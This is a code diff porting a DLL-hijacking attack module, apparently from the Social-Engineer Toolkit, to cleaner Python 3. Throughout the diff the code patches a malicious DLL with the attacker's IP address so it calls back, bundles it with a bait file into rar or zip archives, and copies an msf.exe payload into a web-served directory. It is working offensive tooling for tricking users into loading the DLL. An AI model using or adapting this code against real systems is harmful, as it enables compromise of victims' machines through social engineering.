@@ -10,6 +10,7 @@ import time
 import sys
 import glob
 import binascii
+import shutil
 from src.core.menu.text import dll_hijacker_text
 from src.core.setcore import *
 
@@ -60,15 +61,15 @@ for line in fileopen:
 print("\n   [*] You have selected the file extension of %s and vulnerable dll of %s" % (extension, dll))
 
 # prep the directories
-subprocess.Popen("mkdir " + userconfigpath + "dll", stdout=subprocess.PIPE,
-                 stderr=subprocess.PIPE, shell=True).wait()
+dll_path = os.path.join(userconfigpath, "dll")
+os.makedirs(dll_path, exist_ok=True)
 filename1 = input(setprompt(
     ["2", "15"], "Enter the filename for the attack (example:openthis) [openthis]"))
 if filename1 == "":
     filename1 = "openthis"
 
 # move the files there using the correct extension and file type
-filewrite = open(userconfigpath + "dll/%s%s" % (filename1, extension), "w")
+filewrite = open(os.path.join(dll_path, "%s%s" % (filename1, extension)), "w")
 filewrite.write("EMPTY")
 filewrite.close()
 
@@ -82,11 +83,11 @@ else:
 fileopen = open("src/webattack/dll_hijacking/hijacking.dll", "rb")
 data = fileopen.read()
 
-filewrite = open(userconfigpath + "dll/%s" % (dll), "wb")
+filewrite = open(os.path.join(dll_path, dll), "wb")
 
-host = int(len(ipaddr) + 1) * "X"
+host = ((len(ipaddr) + 1) * "X").encode("ascii")
 
-filewrite.write(data.replace(str(host), ipaddr + "\x00", 1))
+filewrite.write(data.replace(host, (ipaddr + "\x00").encode("utf-8"), 1))
 filewrite.close()
 
 
@@ -118,16 +119,14 @@ if choice == "1":
 
     # basic counter
     counter = 0
-    # look for rar in default directories
-    rar_check = subprocess.Popen("rar", shell=True, stdout=subprocess.PIPE)
-    # comunicate with the process
-    stdout_value = rar_check.communicate()[0]
-    # do a search to see if rar is present
-    match = re.search("Add files to archive", stdout_value)
-    # we get a hit?
-    if match:
-        subprocess.Popen("cd %s/dll;rar a %s/template.rar * 1> /dev/null 2> /dev/null" %
-                         (userconfigpath, userconfigpath), shell=True).wait()
+    if shutil.which("rar"):
+        archive_path = os.path.join(userconfigpath, "template.rar")
+        dll_files = glob.glob(os.path.join(dll_path, "*"))
+        subprocess.Popen(
+            ["rar", "a", archive_path] + dll_files,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        ).wait()
         counter = 1
 
     # if we didnt find rar
@@ -140,10 +139,12 @@ if choice == "1":
 if choice == "2":
     # write to a zipfile here
     file = zipfile.ZipFile(userconfigpath + "template.zip", "w")
-    for name in glob.glob(userconfigpath + "dll/*"):
+    for name in glob.glob(os.path.join(dll_path, "*")):
         file.write(name, os.path.basename(name), zipfile.ZIP_DEFLATED)
     file.close()
 
 if os.path.isfile(userconfigpath + "msf.exe"):
-    subprocess.Popen("cp %s/msf.exe %s/src/html/" %
-                     (userconfigpath, definepath), shell=True).wait()
+    shutil.copyfile(
+        os.path.join(userconfigpath, "msf.exe"),
+        os.path.join(definepath, "src", "html", "msf.exe"),
+    )
